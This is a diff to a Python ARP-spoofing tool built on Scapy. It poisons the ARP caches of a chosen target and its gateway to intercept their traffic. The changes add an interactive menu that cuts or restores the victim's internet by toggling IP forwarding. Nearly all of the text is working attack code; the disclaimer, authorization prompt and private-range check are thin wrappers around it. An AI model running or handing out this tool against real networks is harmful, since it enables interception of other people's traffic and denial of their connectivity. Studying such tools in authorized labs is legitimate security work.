@@ -6,16 +6,16 @@ Requires explicit authorization. See README for Rules of Engagement.
 import sys
 import os
 import time
-import signal
+import threading
 from datetime import datetime
 
 try:
-    from scapy.all import ARP, Ether, sendp, getmacbyip, conf
+    from scapy.all import ARP, Ether, sendp, getmacbyip
 except ImportError:
-    print("[!] Scapy not installed. Run: pip install -r requirements.txt")
+    print("[!] Scapy not installed. Run: sudo apt install python3-scapy -y")
     sys.exit(1)
 
-# ============ Legal Disclaimer (Computer Crimes Act 1997) ============
+# ============ Legal Disclaimer ============
 LEGAL_TEXT = """
 ================================================================================
 LEGAL DISCLAIMER - COMPUTER CRIMES ACT 1997 (MALAYSIA)
@@ -48,7 +48,6 @@ def prompt_scope():
     gateway_ip = input("Gateway IP (default 127.0.0.1): ").strip() or "127.0.0.1"
     iface = input("Interface (default eth0): ").strip() or "eth0"
 
-    # Safe default: refuse public IPs without explicit override
     if not (target_ip.startswith("192.168.") or target_ip.startswith("10.") or
             target_ip.startswith("172.") or target_ip == "127.0.0.1"):
         print(f"[!] Target {target_ip} is outside private ranges.")
@@ -59,7 +58,7 @@ def prompt_scope():
     print(f"[*] Scope locked: target={target_ip}, gateway={gateway_ip}, iface={iface}")
     return target_ip, gateway_ip, iface
 
-# ============ ARP Spoofing Core ============
+# ============ ARP Core ============
 def get_mac(ip):
     mac = getmacbyip(ip)
     if mac is None:
@@ -68,25 +67,21 @@ def get_mac(ip):
     return mac
 
 def spoof(target_ip, target_mac, spoof_ip, iface):
-    """Send one forged ARP reply: tell target that spoof_ip is at our MAC."""
     pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    # Wrap in Ether to silence scapy warning and ensure delivery
     frame = Ether(dst=target_mac) / pkt
     sendp(frame, iface=iface, verbose=False)
 
 def restore(target_ip, target_mac, real_ip, real_mac, iface):
-    """Restore the target's ARP table with correct mapping."""
     pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac,
               psrc=real_ip, hwsrc=real_mac)
     frame = Ether(dst=target_mac) / pkt
     sendp(frame, iface=iface, count=5, verbose=False)
 
-# ============ Output Directory ============
+# ============ Output / Logging ============
 OUTPUT_DIR = "output"
 
 def ensure_output_dir():
     os.makedirs(OUTPUT_DIR, exist_ok=True)
-    return OUTPUT_DIR
 
 def log_event(msg):
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -95,41 +90,72 @@ def log_event(msg):
     with open(os.path.join(OUTPUT_DIR, "session.log"), "a") as f:
         f.write(line + "\n")
 
+# ============ Interactive menu ============
+stop_event = threading.Event()
+
+def set_forwarding(enabled: bool):
+    os.system(f"echo {1 if enabled else 0} > /proc/sys/net/ipv4/ip_forward")
+    state = "ENABLED (victim has internet through Kali)" if enabled else "DISABLED (victim internet CUT)"
+    log_event(f"IP forwarding {state}")
+
+def menu_loop(target_ip, gateway_ip, iface):
+    print("\n--- Interactive menu (type a letter + Enter) ---")
+    print("  c = cut victim internet (forwarding OFF)")
+    print("  r = restore victim internet (forwarding ON)")
+    print("  s = status")
+    print("  q = quit (same as Ctrl+C)\n")
+    while not stop_event.is_set():
+        try:
+            cmd = input().strip().lower()
+        except EOFError:
+            break
+        if cmd == "c":
+            set_forwarding(False)
+        elif cmd == "r":
+            set_forwarding(True)
+        elif cmd == "s":
+            fw = open("/proc/sys/net/ipv4/ip_forward").read().strip()
+            state = "ENABLED" if fw == "1" else "DISABLED"
+            log_event(f"[STATUS] target={target_ip} gateway={gateway_ip} iface={iface} forwarding={state}")
+        elif cmd == "q":
+            log_event("Quit command received.")
+            stop_event.set()
+            return
+
 # ============ Main ============
 def main():
     require_authorization()
     target_ip, gateway_ip, iface = prompt_scope()
     ensure_output_dir()
 
-    # Resolve MACs
     log_event(f"Resolving MAC for target {target_ip} ...")
     target_mac = get_mac(target_ip)
     log_event(f"Resolving MAC for gateway {gateway_ip} ...")
     gateway_mac = get_mac(gateway_ip)
-
     log_event(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")
 
-    # Enable IP forwarding (Linux only)
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    log_event("IP forwarding enabled.")
+    # Start with forwarding ON so victim keeps internet by default
+    set_forwarding(True)
 
-    log_event("Starting ARP spoofing. Press Ctrl+C to stop and restore.")
+    # Start menu thread
+    t_menu = threading.Thread(target=menu_loop, args=(target_ip, gateway_ip, iface), daemon=True)
+    t_menu.start()
+
+    log_event("Starting ARP spoofing. Ctrl+C or 'q' to stop and restore.")
     try:
-        while True:
-            # Poison target: tell it we are the gateway
+        while not stop_event.is_set():
             spoof(target_ip, target_mac, gateway_ip, iface)
-            # Poison gateway: tell it we are the target (full-duplex)
             spoof(gateway_ip, gateway_mac, target_ip, iface)
             time.sleep(2)
     except KeyboardInterrupt:
         log_event("Kill switch activated (Ctrl+C).")
     finally:
-        # Restore ARP tables
+        stop_event.set()
         log_event("Restoring ARP tables ...")
         restore(target_ip, target_mac, gateway_ip, gateway_mac, iface)
         restore(gateway_ip, gateway_mac, target_ip, target_mac, iface)
-        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-        log_event("IP forwarding disabled. Clean exit.")
+        set_forwarding(False)
+        log_event("Clean exit.")
         log_event(f"Logs saved to ./{OUTPUT_DIR}/")
 
 if __name__ == "__main__":
